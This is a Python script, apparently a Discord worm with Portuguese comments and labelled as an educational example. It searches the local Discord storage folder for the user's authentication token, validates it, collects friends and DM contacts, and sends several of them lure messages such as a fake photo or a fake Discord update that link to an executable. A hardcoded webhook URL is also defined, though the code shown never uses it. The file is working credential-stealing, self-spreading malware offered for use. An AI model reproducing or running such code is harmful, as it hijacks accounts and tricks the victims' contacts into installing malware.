#!/usr/bin/env python3
# worm_spreader.py - Exemplo educacional

import os
import re
import time
import json
import random
import requests
import platform
from pathlib import Path
from datetime import datetime

WEBHOOK_TESTE = "https://discord.com/api/webhooks/1497308511925698604/0QHnwxewp68C25pAsPVSMh80ebvM03W9LvyoveKmvx-s_8r6ZnnGtfjTz2346u9leg3Z"

class WormSpreader:
    def __init__(self):
        self.token = None
        self.contatos = []
        self.mensagens_enviadas = 0
        
    def encontrar_token_discord(self):
        print("[1] Procurando token do Discord...")
        home = Path.home()
        sistema = platform.system()
        
        if sistema == "Windows":
            pasta_discord = Path(os.getenv('APPDATA', '')) / 'discord' / 'Local Storage' / 'leveldb'
        elif sistema == "Linux":
            pasta_discord = home / '.config' / 'discord' / 'Local Storage' / 'leveldb'
        elif sistema == "Darwin":
            pasta_discord = home / 'Library' / 'Application Support' / 'discord' / 'Local Storage' / 'leveldb'
        else:
            return None
        
        if not pasta_discord.exists():
            print(f"   ❌ Discord não encontrado")
            return None
        
        padrao_token = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        
        for arquivo in list(pasta_discord.glob("*.log")) + list(pasta_discord.glob("*.ldb")):
            try:
                with open(arquivo, 'r', errors='ignore') as f:
                    conteudo = f.read()
                tokens = re.findall(padrao_token, conteudo)
                if tokens:
                    print(f"   ✅ Token encontrado!")
                    return tokens[0]
            except:
                continue
        
        print(f"   ❌ Nenhum token encontrado")
        return None
    
    def validar_token(self, token):
        print("[2] Validando token...")
        try:
            headers = {"Authorization": token}
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
            if response.status_code == 200:
                dados = response.json()
                print(f"   ✅ Token válido para: {dados.get('username')}")
                return True
            else:
                print(f"   ❌ Token inválido")
                return False
        except:
            print(f"   ❌ Erro ao validar")
            return False
    
    def obter_contatos(self, token):
        print("[3] Obtendo contatos...")
        headers = {"Authorization": token}
        contatos = []
        
        try:
            response = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers, timeout=10)
            if response.status_code == 200:
                canais = response.json()
                for canal in canais:
                    if canal.get('recipients'):
                        for dest in canal['recipients']:
                            contatos.append({"id": dest['id'], "nome": dest['username']})
                            print(f"   📋 {dest['username']}")
        except:
            pass
        
        try:
            response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers, timeout=10)
            if response.status_code == 200:
                for rel in response.json():
                    if rel.get('type') == 1:
                        user = rel.get('user', {})
                        contatos.append({"id": user.get('id'), "nome": user.get('username')})
                        print(f"   📋 {user.get('username')}")
        except:
            pass
        
        ids_vistos = set()
        contatos_unicos = []
        for c in contatos:
            if c['id'] not in ids_vistos:
                ids_vistos.add(c['id'])
                contatos_unicos.append(c)
        
        print(f"   ✅ Total: {len(contatos_unicos)} contatos")
        return contatos_unicos
    
    def gerar_mensagem(self, nome):
        mensagens = [
            f"Eai {nome}! Olha essa foto sua: https://github.com/falso/update.exe",
            f"Oi {nome}! Atualização do Discord: https://github.com/falso/update.exe",
        ]
        return random.choice(mensagens)
    
    def enviar_mensagem(self, token, contato_id, mensagem):
        headers = {"Authorization": token}
        try:
            response = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": contato_id}, timeout=10)
            if response.status_code != 200:
                return False
            channel_id = response.json()['id']
            msg_resp = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json={"content": mensagem}, timeout=10)
            return msg_resp.status_code == 200
        except:
            return False
    
    def executar(self):
        print("\n" + "="*50)
        print("🐛 WORM SPREADER")
        print("="*50 + "\n")
        
        token = self.encontrar_token_discord()
        if not token:
            print("❌ Token não encontrado")
            return
        
        if not self.validar_token(token):
            print("❌ Token inválido")
            return
        
        contatos = self.obter_contatos(token)
        if not contatos:
            print("❌ Nenhum contato")
            return
        
        enviadas = 0
        for contato in contatos[:10]:
            msg = self.gerar_mensagem(contato['nome'])
            if self.enviar_mensagem(token, contato['id'], msg):
                enviadas += 1
                print(f"   ✉️ Enviado: {contato['nome']}")
            time.sleep(1)
        
        print(f"\n✅ Concluído! {enviadas} mensagens enviadas")

if __name__ == "__main__":
    worm = WormSpreader()
    worm.executar()